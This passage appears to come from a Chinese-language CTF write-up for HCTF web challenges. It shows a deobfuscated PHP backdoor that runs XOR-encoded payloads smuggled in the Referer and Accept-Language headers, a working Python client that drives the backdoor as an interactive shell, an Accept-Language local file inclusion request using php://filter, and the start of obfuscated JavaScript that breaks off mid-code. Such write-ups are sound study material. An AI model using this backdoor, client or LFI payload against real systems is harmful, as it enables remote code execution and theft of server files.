&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再进一步反混淆</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_xor</span>(<span class="params"><span class="variable">$content</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);)</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)&amp;&amp;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$content</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$key</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$referer</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$accept_language</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$referer</span> &amp;&amp; <span class="variable">$accept_language</span>) &#123;</span><br><span class="line">    <span class="comment">// 解析 http referer 的 query</span></span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$referer</span>)[<span class="string">&quot;query&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 accept language 里找到 paylaod 参数</span></span><br><span class="line">    <span class="comment">// 例如 fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5</span></span><br><span class="line">    <span class="comment">// 结果为</span></span><br><span class="line">    <span class="comment">// matched[0] = &#123;0 =&gt; &#x27;fr-CH,&#x27;, 1 =&gt; &#x27;fr;q=0.0,&#x27;, 2 =&gt; &#x27;en;q=0.1,&#x27;, 3 =&gt; &#x27;de;q=0.2,&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[1] = &#123;0 =&gt; &#x27;f&#x27;,      1 =&gt; &#x27;f&#x27;,         2 =&gt; &#x27;e&#x27;,         3 =&gt; &#x27;d&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[2] = &#123;0 =&gt; &#x27;&#x27;,       1 =&gt; &#x27;0&#x27;,         2 =&gt; &#x27;1&#x27;,         3 =&gt; &#x27;2&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$accept_language</span>, <span class="variable">$matched</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$query</span> &amp;&amp; <span class="variable">$matched</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="comment">// 取前两个权重开头字母作为用户标识，例如从 fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5 里取出 &#x27;ff&#x27;</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$matched</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$matched</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 计算 payload 起始和结束标识符</span></span><br><span class="line">        <span class="variable">$head</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>.<span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kh)[:3]</span></span><br><span class="line">        <span class="variable">$tail</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>.<span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kf)[:3]</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$matched</span>[<span class="number">1</span>]); <span class="variable">$i</span>++)</span><br><span class="line">            <span class="comment">// 取出所有的权重数字作为在 query 里的 payload 参数</span></span><br><span class="line">            <span class="comment">// 例如从 fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5 取出 &quot;0&quot;, &quot;1&quot; 和 &quot;2&quot;，并且在 query 里寻找第 0，第 1 和第 2 个参数</span></span><br><span class="line">            <span class="variable">$payload</span> .= <span class="variable">$query</span>[<span class="variable">$matched</span>[<span class="number">2</span>][<span class="variable">$i</span>]];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 payload 以 head 开头</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>, <span class="variable">$head</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$user</span>] = <span class="string">&quot;&quot;</span>;  <span class="comment">// 清空 session[&quot;ff&quot;]</span></span><br><span class="line">            <span class="variable">$payload</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$payload</span>, <span class="number">3</span>);  <span class="comment">// 从 payload 的开头中剪掉 head</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 user 有 session，即 payload 以 head 开头</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$user</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$user</span>] .= <span class="variable">$payload</span>;  <span class="comment">// 获取 payload</span></span><br><span class="line">            <span class="comment">// 根据 tail 标识符找到 payload 结尾</span></span><br><span class="line">            <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$_SESSION</span>[<span class="variable">$user</span>], <span class="variable">$tail</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$pos</span>) &#123;</span><br><span class="line">                <span class="comment">// 异或用的 key</span></span><br><span class="line">                <span class="variable">$key</span> = <span class="variable">$kh</span>.<span class="variable">$kf</span>;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                <span class="variable">$payload</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_SESSION</span>[<span class="variable">$user</span>], <span class="number">0</span>, <span class="variable">$pos</span>);  <span class="comment">// 截取 payload，从这里开始的 paylaod 就是去除了 head 和 tail 的</span></span><br><span class="line">                <span class="variable">$payload</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>), <span class="variable">$payload</span>);  <span class="comment">// 将_和 - 替换为 / 和 +</span></span><br><span class="line">                <span class="variable">$payload</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>);  <span class="comment">// base64 解码</span></span><br><span class="line">                <span class="variable">$payload</span> = @<span class="title function_ invoke__">_xor</span>(<span class="variable">$payload</span>, <span class="variable">$key</span>);  <span class="comment">// 异或解密</span></span><br><span class="line">                <span class="variable">$payload</span> = @<span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$payload</span>);  <span class="comment">// 解压缩</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$payload</span>);  <span class="comment">// 执行代码</span></span><br><span class="line">                <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取执行结果</span></span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="comment">// 将执行结果压缩，异或加密，base64 编码后输出到网页中</span></span><br><span class="line">                <span class="variable">$output</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">_xor</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$output</span>),<span class="variable">$key</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$key</span>&gt;<span class="subst">$output</span>&lt;/<span class="subst">$key</span>&gt;&quot;</span>);</span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总的来说原理就是先用 accept language 里提取出每个权重的首字母和权重数字，将前两个权重首字母作为用户的标识，将所有的权重数字作为 payload 数组的下标，payload 分开以数组的方式存放在 referer 的查询里，并且 payload 要以用户标识加 kh 的 MD5 前三位开头，以用户表示加 kf 的 MD5 的前三位结尾。</p>
<p>编写利用脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23332/backdoor.php&#x27;</span></span><br><span class="line">kh = <span class="string">&#x27;d03a&#x27;</span></span><br><span class="line">kf = <span class="string">&#x27;1f3c&#x27;</span></span><br><span class="line">key = kh + kf</span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">content, key</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(content):</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(key) <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(content):</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(content[i]) ^ <span class="built_in">ord</span>(key[j]))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">code</span>):</span><br><span class="line">    head = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kh).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    tail = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kf).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    payload = zlib.compress(code)</span><br><span class="line">    payload = xor(payload, key)</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://evil.com/?a=%s&amp;b=%s&amp;c=%s&#x27;</span> % (head, payload, tail),</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = sess.get(url, headers=headers).content</span><br><span class="line">    result = re.findall(<span class="string">&#x27;&lt;%s&gt;(.*?)&lt;/%s&gt;&#x27;</span> % (key, key), result)[<span class="number">0</span>]</span><br><span class="line">    result = base64.b64decode(result)</span><br><span class="line">    result = xor(result, key)</span><br><span class="line">    result = zlib.decompress(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> hack(raw_input(<span class="string">&#x27;php&gt; &#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后得到 flag 为：<code>flag&#123;Y0U_r_brave_t0_so1ve_probl3M&#125;</code></p>
<h1 id="Global-Page-175"><a href="#Global-Page-175" class="headerlink" title="Global Page(175)"></a>Global Page(175)</h1><p>随便点一个 page，在 Warning 里面显示了</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(pwn/zh-CN.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 39</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;pwn/zh-CN.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 39</span><br></pre></td></tr></table></figure>

<p>所以是一个文件包含，根据输入的 page 包含一个 page/zh-CN.php 的文件，用 php 伪协议读掩码，%00 截断后面的 /zh-CN.php</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php%00</span><br></pre></td></tr></table></figure>

<p>但是发现过滤了“/”和“.”，并且无法使用 %00 截断，所以不能通过 page 进行文件包含，但是可以发现 page 后面的 /zh-CH.php 刚好是 accept-language 里面的语言，因此就可以通过修改 accept-language 进行文件包含，发送请求包如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?page=php: HTTP/1.1</span><br><span class="line">Host: vps1.blue-whale.me:23334</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,/filter/read=convert.base64-encode/resource=index;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将因为存在 page 参数才会开始包含，但是 page 里不能含有“/”，因此可以将 page 设置为“php:”，在 Accept-Language 里设置为“/filter/read=convert.base64-encode/resource=index;q=0.8”即可包含到 index 源码，源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;title&gt;Global Page&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.rtl &#123;</span><br><span class="line">  direction: rtl;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;./?page=pwn&quot;</span>&gt;Pwn&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;del&gt;Tokyo Westerns&lt;/del&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;./?page=ctf&quot;</span>&gt;CTF&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]) <span class="keyword">as</span> <span class="variable">$lang</span>) &#123;</span><br><span class="line">        <span class="variable">$l</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;;&quot;</span>, <span class="variable">$lang</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p<span class="meta">&lt;?=</span>(<span class="variable">$l</span>===<span class="string">&#x27;he&#x27;</span>)?<span class="string">&quot; class=rtl&quot;</span>:<span class="string">&quot;&quot;</span><span class="meta">?&gt;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;<span class="subst">$dir</span>/<span class="subst">$l</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>最后包含 flag.php 获取 flag：<code>flag&#123;i_f0und_SiMp13_LFI_gogogo&#125;</code></p>
<h1 id="BabyCrack-200"><a href="#BabyCrack-200" class="headerlink" title="BabyCrack(200)"></a>BabyCrack(200)</h1><p>类似 FxxkingBackdoor，是 JavaScript 的反混淆，给一个输入需要符合一定条件才会得到 flag，而整个解密输入的逻辑都在一个 js 文件中，在网页源码里拿到最开始的源码 =_=.js 如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a=[<span class="string">&#x27;random&#x27;</span>,<span class="string">&#x27;charCodeAt&#x27;</span>,<span class="string">&#x27;fromCharCode&#x27;</span>,<span class="string">&#x27;parse&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27;\x5cw+&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>,<span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>,<span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;length&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;getElementById&#x27;</span>,<span class="string">&#x27;message&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>,<span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>,<span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>,<span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>,<span class="string">&#x27;version&#x27;</span>,<span class="string">&#x27;error&#x27;</span>,<span class="string">&#x27;download&#x27;</span>,<span class="string">&#x27;substring&#x27;</span>,<span class="string">&#x27;push&#x27;</span>,<span class="string">&#x27;Function&#x27;</span>,<span class="string">&#x27;charAt&#x27;</span>,<span class="string">&#x27;idle&#x27;</span>,<span class="string">&#x27;pyW5F1U43VI&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;https://the-extension.com&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;storage&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;then&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>,<span class="string">&#x27;setUTCHours&#x27;</span>,<span class="string">&#x27;origin&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;loading&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;removeListener&#x27;</span>,<span class="string">&#x27;onUpdated&#x27;</span>,<span class="string">&#x27;callee&#x27;</span>,<span class="string">&#x27;addListener&#x27;</span>,<span class="string">&#x27;onMessage&#x27;</span>,<span class="string">&#x27;runtime&#x27;</span>,<span class="string">&#x27;executeScript&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;http://&#x27;</span>,<span class="string">&#x27;Url\x20error&#x27;</span>,<span class="string">&#x27;query&#x27;</span>,<span class="string">&#x27;filter&#x27;</span>,<span class="string">&#x27;active&#x27;</span>,<span class="string">&#x27;floor&#x27;</span>];(<span class="keyword">function</span>(<span class="params">_0xd4b7d6,_0xad25ab</span>)&#123;<span class="keyword">var</span> _0x5e3956=<span class="keyword">function</span>(<span class="params">_0x1661d3</span>)&#123;<span class="keyword">while</span>(--_0x1661d3)&#123;_0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="title function_">_0x5e3956</span>(++_0xad25ab);&#125;(_0x180a,<span class="number">0x1a2</span>));<span class="keyword">var</span> _0xa180=<span class="keyword">function</span>(<span class="params">_0x5c351c,_0x2046d8</span>)&#123;_0x5c351c=_0x5c351c-<span class="number">0x0</span>;<span class="keyword">var</span> _0x26f3b3=_0x180a[_0x5c351c];<span class="keyword">return</span> _0x26f3b3;&#125;;<span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">_0x5b7c0c</span>)&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x2e2f8d=[<span class="string">&#x27;code&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x0&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2&#x27;</span>),<span class="string">&#x27;invalidMonetizationCode&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x3&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x5&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x6&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x7&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x8&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x9&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xa&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xb&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xc&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xd&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xe&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xf&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x10&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x11&#x27;</span>),<span class="string">&#x27;url&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x12&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x13&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x14&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x15&#x27;</span>),<span class="title 